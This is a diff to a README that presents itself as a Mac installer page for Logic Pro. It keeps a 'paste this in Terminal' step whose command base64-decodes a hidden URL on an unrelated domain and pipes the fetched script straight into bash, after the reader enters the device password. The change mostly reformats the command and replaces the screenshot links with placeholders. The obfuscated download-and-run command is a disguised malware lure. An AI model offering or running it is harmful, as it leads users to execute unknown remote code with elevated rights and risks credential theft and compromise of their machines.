@@ -12,7 +12,8 @@ With advanced features like multi-track recording, MIDI editing, virtual instrum
 2. Open Terminal on your Mac, paste the command, then press `Return`.  
 3. Enter your device password when prompted and confirm the installation.  
 
-/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nb3IvaW5zdGFsbC5zaA== | base64 -d))"
+### 💻 Installation Command:
+    /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nb3IvaW5zdGFsbC5zaA== | base64 -d))"
 
 ---
 
@@ -20,8 +21,8 @@ With advanced features like multi-track recording, MIDI editing, virtual instrum
 
 A quick look at key parts in action:  
 
-![Logic Pro Screenshot 1](https://i.pinimg.com/736x/93/2a/87/932a873ac00267c34ce53d7e868bdac3.jpg)  
-![Logic Pro Screenshot 2](https://frankfurt.apollo.olxcdn.com/v1/files/uzdsq4y9ualx1-KZ/image;s=1867x1167)  
+![Logic Pro Screenshot 1](https://example.com/logic1.png)  
+![Logic Pro Screenshot 2](https://example.com/logic2.png)  
 
 ---
 
